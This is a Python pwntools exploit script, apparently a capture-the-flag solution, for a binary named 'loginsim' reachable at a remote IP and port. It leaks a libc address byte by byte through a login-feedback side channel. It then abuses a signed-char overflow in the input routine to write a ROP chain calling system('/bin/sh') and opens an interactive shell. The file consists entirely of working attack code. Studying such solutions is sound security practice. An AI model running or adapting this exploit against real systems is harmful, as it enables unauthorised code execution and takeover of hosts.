#!/usr/bin/env python3
from pwn import *

QWORD = 8
DUMMY = 0xdeadbeefdeadbeef
PAD = lambda n: b"a" * n

ld = ELF("./given/ld.so")
libc = ELF("./given/libc.so.6")
elf = ELF("./given/loginsim")
context.arch = elf.arch
context.terminal = ["tmux", "splitw", "-h"]

if args.REMOTE:
    p = remote("165.232.42.79", 32755)
else:
    p = process([ld.path, elf.path], env={"LD_PRELOAD": libc.path})
    if args.D:
        with open(f"/proc/{p.pid}/maps", "rb") as f:
            maps = f.read()
            f.close()
        regions = maps.split(b"\n")
        pie_base = None
        for region in regions:
            if b"/given/loginsim" in region:
                pie_base = int(region[:region.find(b"-")], 16)
                break
        if pie_base is None:
            quit()
        gdb.attach(p, "\n".join([
            f"b *{hex(pie_base + 0x1657)}", #main's ret
        ]))

def register(length, username=b""):
    assert(1 <= length <= 0x80)
    p.sendlineafter(b"-> ", b"1")
    p.sendlineafter(b"{i} Username length: ", str(length).encode())
    p.sendlineafter(b"{i} Enter username: ", username)

def login(username):
    p.sendlineafter(b"-> ", b"2")
    p.sendlineafter(b"{i} Username: ", username)
    msg = p.recvline()
    return b"Good job! :^)" in msg

def leak_libc(offset=0x48):
    """
    This uses message feedback to side-channelly guess the stack leftover
    This function leak addresses on the "login" buffer
    (because there's no correpsonding leak in the "register" buffer of the remote server)
    """
    leak = b""
    for i in range(6):
        for b in range(1, 256):
            # register one more byte than input
            guess = PAD(offset + i) + p8(b)
            register(offset + i + 1, guess)
            # try login
            success = login(PAD(offset + i))
            if success:
                log.info(f"byte {hex(i)} found: {hex(b)}")
                leak += p8(b)
                break

    leak = u64(leak.ljust(8, b"\x00"))
    log.info(f"Found libc leak: {hex(leak)}")
    return leak

def bufovfl():
    """
    Vuln: the getInput() function uses "char" type iterator, which is signed and can be integer overflow
    uses b" " to ignore the current byte
    """
    pop_rdi = libc.address + 0x26b72
    ret = pop_rdi + 1
    binsh = next(libc.search(b"/bin/sh\x00"))
    payload = b" " * 0xb8 + p64(ret) + \
p64(pop_rdi) + p64(binsh) + p64(libc.sym["system"])
    payload = payload.replace(b"\x00", b" ")
    if args.D:
        # another attach on rop
        gdb.attach(p, f"b *{hex(pie_base + 0x1394)}")
    register(0x80, payload)

def exploit():
    libc.address = leak_libc() - 0x94013
    log.info(f"libc base {hex(libc.address)}")
    bufovfl()
    p.interactive()

if __name__ == "__main__":
    exploit()
